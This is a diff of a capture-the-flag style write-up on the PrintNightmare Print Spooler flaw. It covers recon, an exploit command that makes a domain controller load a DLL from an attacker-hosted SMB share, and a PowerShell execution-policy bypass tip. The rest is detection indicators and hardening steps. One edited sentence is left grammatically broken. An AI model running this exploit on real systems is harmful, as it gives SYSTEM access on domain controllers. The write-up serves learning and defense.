@@ -24,7 +24,7 @@ cover:
 
 ## TL;DR
 
-A dual offense-and-defense room built around **PrintNightmare** — a
+A dual offense-and-defense room built around **PrintNightmare**, a
 vulnerability in the Windows Print Spooler service that lets an
 authenticated user (any domain user, since the spooler runs by default on
 every workstation and every domain controller) push a malicious "printer
@@ -37,26 +37,26 @@ artifacts in Windows Event Logs and Sysmon telemetry.
 
 ## Recon
 
-This is a guided TryHackMe room, not an open-ended box — target scope,
+This is a guided TryHackMe room, not an open-ended box, target scope,
 credentials for `spoolsvc`, and the fact that the vulnerable Print
 Spooler service is running on the DC are all given in the task brief.
 So "recon" here is confirming the environment matches PrintNightmare's
 preconditions rather than sweeping for open ports:
 
 - **Print Spooler service is running on the DC.** `Get-Service Spooler`
-  from a low-priv shell returns `Running`; enumerating over RPC from
+  from a low-priv shell returns `Running`. Enumerating over RPC from
   Kali (`impacket-rpcdump @<DC>` → look for `MS-PAR / MS-RPRN`) is the
   authenticated equivalent.
 - **The account has SMB access to the DC.** PrintNightmare loads the
   malicious driver DLL from a UNC path, so the DC needs to be able to
-  reach a share hosted by the attacker — trivial on a lab flat
+  reach a share hosted by the attacker, trivial on a lab flat
   network, worth verifying on a segmented one.
 - **PowerShell script execution is available** for the client-side of
   the exploit (delivering the payload). If `Set-ExecutionPolicy` is
   locked down, `-ep bypass` on the CLI is usually enough.
 
 Once those three are true, the exploit conditions are met and I can
-move to the PoC — no port sweep needed.
+move to the PoC, no port sweep needed.
 
 ---
 
@@ -67,7 +67,7 @@ Windows host, including domain controllers (which use it for printer
 pruning across the domain). PrintNightmare covers two related CVEs:
 **CVE-2021-1675**, initially classified as a local privilege escalation
 issue, and **CVE-2021-34527**, a follow-up disclosure showing the same
-underlying flaw is exploitable **remotely** — an attacker with any
+underlying flaw is exploitable **remotely**, an attacker with any
 authenticated domain access, not local console access, can trigger it.
 
 The vulnerable function (`RpcAddPrinterDriverEx`, exposed over MS-RPRN/
@@ -88,7 +88,7 @@ Metasploit handler:
 3. Confirm the target is exposed by checking whether the vulnerable RPC
    interfaces (MS-RPRN / MS-PAR) are reachable (`rpcdump.py`).
 4. Run the exploit against the domain controller with a **low-privileged
-   domain credential** — authenticated, not administrative — pointing it at
+   domain credential**, authenticated, not administrative, pointing it at
    the DLL hosted on the attacker's SMB share.
 
 ```bash
@@ -102,7 +102,7 @@ python3 CVE-2021-1675.py <DOMAIN>/<user>:<password>@<TARGET_IP> '\\<ATTACKER_IP>
 
 The vulnerable print spooler process connects back to the attacker's SMB
 share to fetch the "driver" and loads it, executing the DLL as **SYSTEM**
-on the domain controller — the exploit's danger comes precisely from
+on the domain controller, the exploit's danger comes precisely from
 requiring no local access and no elevated starting privilege at all.
 
 ---
@@ -114,7 +114,7 @@ walking through the Windows Event Log and Sysmon artifacts a PrintNightmare
 attack leaves behind:
 
 - **`Microsoft-Windows-PrintService/Operational`** (Event ID 316) logs new
-  or updated printer driver files being added — the direct artifact of the
+  or updated printer driver files being added, the direct artifact of the
   malicious "driver" being installed.
 - **`Microsoft-Windows-PrintService/Admin`** (Event ID 808) flags a failed
   or suspicious driver registration attempt.
@@ -122,8 +122,8 @@ attack leaves behind:
   creation) around `spoolsv.exe`'s driver directory
   (`%WINDIR%\System32\spool\drivers\x64\3\`) catch the dropped DLL and any
   outbound connection it makes.
-- **`spoolsv.exe` spawning `rundll32.exe`** as a child process — normal
-  print spooler operation never does this — is one of the highest-signal
+- **`spoolsv.exe` spawning `rundll32.exe`** as a child process, normal
+  print spooler operation never does this. Is one of the highest-signal
   behavioral indicators.
 - Mimikatz-based exploitation of the same vulnerability leaves a
   distinctive fake printer driver name registered in the system.
@@ -145,11 +145,11 @@ Microsoft's guidance (beyond installing the security patches released in
 July 2021) includes:
 
 - Disabling the Print Spooler service entirely where printing isn't
-  required — this fully removes the attack surface, at the cost of losing
+  required. This fully removes the attack surface, at the cost of losing
   local and remote printing.
 - Disabling inbound remote printing via Group Policy
   (`Computer Configuration → Administrative Templates → Printers → Allow
-  Print Spooler to accept client connections`) — blocks the remote vector
+  Print Spooler to accept client connections`), blocks the remote vector
   while still allowing local printing to directly attached devices.
 - Confirming the `PointAndPrint` registry policy keys
   (`NoWarningNoElevationOnInstall`, `UpdatePromptSettings`) are not set to
@@ -160,14 +160,14 @@ July 2021) includes:
 ## Lessons Learned
 
 - **A vulnerability's "local" classification can change once further
-  research reveals a remote trigger path** — CVE-2021-1675 and
+  research reveals a remote trigger path**, CVE-2021-1675 and
   CVE-2021-34527 are the same underlying bug with two different disclosed
   attack vectors, and treating them as unrelated undercounts the real risk.
 - **Domain controllers running default services (like the Print Spooler)
-  are not automatically low-risk just because "no one prints from a DC"** —
+  are not automatically low-risk just because "no one prints from a DC"**,
   the service being enabled by default is itself the exposure.
 - **Detection engineering benefits from understanding the exploit
-  mechanically** — knowing exactly which registry path, event log, and
+  mechanically**, knowing exactly which registry path, event log, and
   child-process relationship the exploit touches is what makes a detection
   rule precise rather than a generic "printer errors" alert.
 
@@ -178,7 +178,7 @@ July 2021) includes:
 - **Apply the July 2021 out-of-band patch** for CVE-2021-34527 on every
   Windows host, not just DCs. The RCE path was fixed there.
 - **Disable the Print Spooler service on Domain Controllers** and any
-  server that does not need to accept print jobs — the DC is not a
+  server that does not need to accept print jobs, the DC is not a
   printer, so this is a zero-impact hardening step:
 
   ```powershell
@@ -186,7 +186,7 @@ July 2021) includes:
   Set-Service -Name Spooler -StartupType Disabled
   ```
 
-- **Restrict `Point and Print` policy** through GPO — set
+- **Restrict `Point and Print` policy** through GPO. Set
   `NoWarningNoElevationOnInstall = 0` and `UpdatePromptSettings = 0`
   under `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint`
   so non-admin users cannot install a print driver silently even if
